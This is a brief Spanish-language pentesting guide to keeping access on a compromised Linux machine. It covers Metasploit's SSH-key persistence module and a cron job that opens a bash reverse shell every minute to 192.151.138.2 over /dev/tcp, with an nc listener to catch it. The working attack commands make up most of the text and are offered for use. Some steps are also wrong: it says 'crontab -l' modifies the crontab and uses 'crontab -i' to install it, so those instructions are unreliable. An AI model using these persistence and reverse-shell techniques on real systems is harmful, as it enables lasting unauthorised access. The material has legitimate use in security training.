<h1 align="center">PERSISTENCIA EN LINUX</h1>

## **Persistencia a través de SSH**

Una vez que hemos conseguido vulnerar una máquina Linux, podemos establecer persistencia a través de SSH utilizando Metasploit, siempre y cuando tengamos permiso para editar la carpeta .ssh del usuario.

- `use post/linux/manage/sshkey_persistence.`

Este módulo generará automáticamente una clave pública y privada para todos los usuarios del sistema.Establece la opción CREATESSHFOLDER en true para que el módulo cree la carpeta .ssh si no existe y guarde las claves allí.  

El módulo generará las claves y te indicará dónde se guarda la clave privada del usuario actual en tu máquina local

## **Persistencia a través de Cron Jobs**

Si has conseguido acceso a una máquina Linux con un usuario normal, no podrás modificar el archivo /etc/crontab. Sin embargo, puedes modificar el archivo crontab del usuario actual utilizando el comando crontab -l.

Vamos a añadir una tarea cron que ejecute una reverse shell cada minuto.

- `echo "\* \* \* \* \* /bin/bash -c '/bin/bash -i >& /dev/tcp/192.151.138.2/1234 0>&1'" > cron`
- `crontab -i cron`
- `crontab -l`

Deberías ver la línea que ejecuta la reverse shell cada minuto, establece la escucha y conseguirás la shell

- `nc -lvnp 1234`
